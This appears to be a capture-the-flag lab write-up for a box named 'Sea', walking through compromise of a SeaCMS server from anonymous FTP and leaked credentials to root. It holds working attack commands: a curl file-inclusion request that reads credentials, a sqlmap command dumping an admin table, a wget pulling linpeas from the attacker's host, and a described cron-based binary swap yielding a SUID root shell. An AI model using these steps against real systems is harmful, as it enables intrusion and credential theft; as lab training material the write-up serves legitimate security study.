# Sea

## Initial access

Ran an automated enumeration scan against the target host.

```
sudo autorecon 192.168.229.249
```

The scan revealed four open ports:

- **21** — FTP (vsftpd 3.0.5), anonymous login enabled
- **22** — SSH (OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0))
- **80** — HTTP (Apache httpd 2.4.58 ((Ubuntu)))
  - Additional webpages discovered:
    - `http://192.168.224.162/property-details.html`
    - `http://192.168.224.162/contact.html`
    - `http://192.168.224.162/properties.html`
    - `http://192.168.224.162/assets/`
    - `http://192.168.224.162/vendor/`
- **55743** — HTTP (Apache httpd 2.4.58 ((Ubuntu)))
  - Additional webpages discovered:
    - `http://192.168.224.162:55743/templets/`
    - `http://192.168.224.162:55743/js/`
    - `http://192.168.224.162:55743/gbook.php`
    - `http://192.168.224.162:55743/so.php`
    - `http://192.168.224.162:55743/search.php`
    - `http://192.168.224.162:55743/article/`
    - `http://192.168.224.162:55743/comment/`
    - `http://192.168.224.162:55743/comment.php`
    - `http://192.168.224.162:55743/data/`
    - `http://192.168.224.162:55743/database.php`
    - `http://192.168.224.162:55743/desktop.php`
    - `http://192.168.224.162:55743/detail/`
    - `http://192.168.224.162:55743/err.php`
    - `http://192.168.224.162:55743/exit.php`
    - `http://192.168.224.162:55743/include/`
    - `http://192.168.224.162:55743/i.php`
    - `http://192.168.224.162:55743/install/`
    - `http://192.168.224.162:55743/list/`
    - `http://192.168.224.162:55743/reg.php`
    - `http://192.168.224.162:55743/member.php`
    - `http://192.168.224.162:55743/login.php`
    - `http://192.168.224.162:55743/pic/`
    - `http://192.168.224.162:55743/news/`
    - `http://192.168.224.162:55743/s.php`
    - `http://192.168.224.162:55743/tag.php`
    - `http://192.168.224.162:55743/topic/`
    - `http://192.168.224.162:55743/uploads/`
    - `http://192.168.224.162:55743/video/`
    - `http://192.168.224.162:55743/ass.php`
    - `http://192.168.224.162:55743/diy.php`
    - `http://192.168.224.162:55743/articlelist/`
    - `http://192.168.224.162:55743/topiclist/`

Connected to FTP with anonymous credentials and downloaded all four log files.

```
ftp anonymous@192.168.224.162

ftp> ls -al
229 Entering Extended Passive Mode (|||50717|)
150 Here comes the directory listing.
dr-xr-xr-x    2 0        0            4096 Jun 20  2025 .
dr-xr-xr-x    2 0        0            4096 Jun 20  2025 ..
-rw-rw-r--    1 0        0            5637 Jun 14  2025 log_01.log
-rw-rw-r--    1 0        0            7181 Jun 15  2025 log_02.log
-rw-rw-r--    1 0        0            5627 Jun 14  2025 log_03.log
-rw-rw-r--    1 0        0            5687 Jun 14  2025 log_04.log

ftp> get log_01.log
ftp> get log_02.log
ftp> get log_03.log
ftp> get log_04.log
```

Examined the downloaded log files. `log_01.log`, `log_03.log`, and `log_04.log` all contain references to `/index.php` and `/robots.txt`. `log_02.log` contains references to web pages hosted on SeaCMS with notable log messages pointing to specific server paths:

- `/var/www/SeaCMS/th4o4p/database.php`
  ```
  [2025-05-15 00:58:05] [ERROR] POST /th4o4p/database.php?cfg_dbpwd= exposed in request
  ```
- `/var/www/SeaCMS/th4o4p/admin_safe.php`
  ```
  [2025-06-15 00:37:55] [ERROR] POST /th4o4p/admin_safe.php?id=../etc/passwd
  ...
  [2025-06-15 00:28:49] [ERROR] POST /th4o4p/admin_safe.php?id=../etc/passwd
  ```
- `/var/www/SeaCMS/th4o4p/admin_pay.php`

The log messages suggest a SeaCMS installation on port 55743 is worth further investigation.

Tested the web server on port 80 (`http://192.168.224.162`), but it did not appear to be the SeaCMS web server.

Tested the web server on port 55743 (`http://192.168.224.162:55743/`). The page was displayed in Chinese and identified as a SeaCMS-based site.

Navigated to `http://192.168.224.162:55743/database.php`, which returned plaintext SSH credentials:

```
$hidden_creds = [ 'ssh_user' => 'nicolas', 'ssh_password' => 'ImGonnaBeSuperhero594' ];
```

Tested these credentials via SSH but authentication was denied.

The log file referenced a second `database.php` at a nested path. Navigated to `http://192.168.224.162:55743/th4o4p/database.php`, which returned a different set of credentials:

```
$hidden_creds = [ 'ssh_user' => 'nicolas', 'ssh_password' => 'YoureGonnaMakeIt846' ];
```

Successfully logged in via SSH with the second set of credentials:

```
ssh nicolas@192.168.224.162
nicolas@192.168.224.162's password: YoureGonnaMakeIt846

nicolas@sea:~$ whoami
nicolas
```

Retrieved the `local.txt` flag:

```
nicolas@sea:~$ cat local.txt
f1dd1f8cd725d732618cd779900daea2
```

### Alternative Initial Access — LFI via admin_safe.php

The FTP logs revealed that `admin_safe.php` accepts a file parameter vulnerable to local file inclusion. Used `curl` to read the `database.php` file directly by specifying its path relative to the document root, which returned plaintext SSH credentials without needing to enumerate the directory structure first.

```
curl 'http://$TARGET_IP:55743/th4o4p/admin_safe.php?action=download&file=database.php'
# $hidden_creds = [ 'ssh_user' => 'nicolas', 'ssh_password' => 'YoureGonnaMakeIt846' ];
```

SSH in with the leaked credential to gain the same foothold.

```
ssh nicolas@$TARGET_IP
nicolas@sea:~$ whoami
nicolas
```

Credit: [The Husky Hacker — Sea Writeup](https://hackindex.io/writeups/sea)

### Alternative Initial Access — SQL injection via admin_pay.php

The `admin_pay.php` endpoint is vulnerable to SQL injection on its `id` parameter, consistent with a public SeaCMS advisory (CVE-2025-25520). Automated enumeration with `sqlmap` confirmed the injection and dumped the `sea_admin` table from the `seacms` database, which contained the `nicolas` user's base64-encoded password. Decoding the value recovered the same SSH credential.

```
sqlmap -u "http://$TARGET_IP:55743/th4o4p/admin_pay.php?action=del&id=1" -p id --batch -D seacms -T sea_admin --dump
```

Credit: [The Husky Hacker — Sea Writeup](https://hackindex.io/writeups/sea)

## Privilege escalation

Uploaded `linpeas.sh` to the target for enumeration. Started an HTTP server on the attacker machine and downloaded the script via `wget`:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
nicolas@sea:~$ cd /tmp
nicolas@sea:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Ran `linpeas.sh` to enumerate privilege escalation vectors:

```
nicolas@sea:/tmp$ chmod +x linpeas.sh
nicolas@sea:/tmp$ ./linpeas.sh
```

The most notable finding was plaintext passwords embedded in PHP configuration files:

```
╔══════════╣ Searching passwords in PHP files (T1552.001)
/var/www/SeaCMS/database.php:  'ssh_password' => 'ImGonnaBeSuperhero594'
/var/www/SeaCMS/data/config.user.inc.php:$cfg_mb_pwdmin = '3';
/var/www/SeaCMS/data/config.user.inc.php:$cfg_mb_pwdtype = '32';
/var/www/SeaCMS/login.php:$pwd = substr(md5($pwd),5,20);
/var/www/SeaCMS/login.php:	if($pwd=='')
/var/www/SeaCMS/login.php:if($row1['username']==$userid AND $row1['password']==$pwd)
/var/www/SeaCMS/login.php:"<li><input type=\"password\" name=\"pwd\" class=\"form-control\" placeholder=\"密码\" /></li>".
/var/www/SeaCMS/th4o4p/database.php:  'ssh_password' => 'YoureGonnaMakeIt846'
/var/www/SeaCMS/th4o4p/ebak/class/config.php:$phome_db_password=$cfg_dbpwd;
/var/www/SeaCMS/th4o4p/ebak/class/config.php:$set_password='c3284d0f94606de1fd2af172aba15bf3';
```

Examined `/var/www/SeaCMS/th4o4p/ebak/class/config.php`, which includes the database configuration from relative paths:

```
@include('../../../data/common.inc.php');
@include('../../../../data/common.inc.php');
//Database
$phome_db_dbtype='';
$phome_db_ver='';
$phome_db_server=$cfg_dbhost;
$phome_db_port='';
$phome_db_username=$cfg_dbuser;
$phome_db_password=$cfg_dbpwd;
$phome_db_dbname=$cfg_dbname;
$baktbpre='';
$phome_db_char='utf8';
```

Examined `/var/www/SeaCMS/data/common.inc.php`, which contained MySQL root credentials:

```
<?php
//数据库连接信息
$cfg_dbhost = '127.0.0.1';
$cfg_dbport = 3306;
$cfg_dbname = 'seacms';
$cfg_dbuser = 'root';
$cfg_dbpwd = 'YoureGonnaMakeIt846';
$cfg_dbprefix = 'sea_';
$cfg_db_language = 'utf8';
```

Connected to MySQL as root and enumerated the databases and tables. Queried the `sea_admin` table, which revealed two admin accounts — one with a MD5 hash (`e10da9e6a47cbaa2f663`) and another with a base64-encoded value (`WW91cmVHb25uYU1ha2VJdDg0Ng==`, which decodes to `YoureGonnaMakeIt846`).

Tested the discovered passwords to escalate to root via `su`. The first two failed, but the third succeeded:

```
nicolas@sea:/tmp$ su root
Password: e10da9e6a47cbaa2f663
su: Authentication failure

nicolas@sea:/tmp$ su root
Password: YoureGonnaMakeIt846
su: Authentication failure

nicolas@sea:/tmp$ su root
Password: ImGonnaBeSuperhero594

root@sea:/tmp# whoami
root
```

Retrieved the `proof.txt` flag:

```
root@sea:/tmp# cd /root
root@sea:~# cat proof.txt
c33da4f6eabaa938e5d25c7a20b0f11b
```

### Alternative Privilege Escalation — cron job binary swap with sudo misconfiguration

A cron job named `bin_replacer` runs periodically as root. It scans the user's home directory for hidden dotfiles (files matching `~/.*`) and, if a file in `/bin` shares the same basename, overwrites that binary with the dotfile's contents. The user `nicolas` has a sudo NOPASSWD rule allowing execution of `/bin/ps aux` as root with no password. Since `ps` is a binary in `/bin`, writing a malicious script as `.ps` in the home directory causes the cron job to replace `/bin/ps` with the script. Running `sudo /bin/ps aux` then executes the planted script as root, which drops a SUID copy of `/bin/bash` into `/tmp`. Invoking it with `-p` yields a root shell.

Credit: [The Husky Hacker — Sea Writeup](https://hackindex.io/writeups/sea)
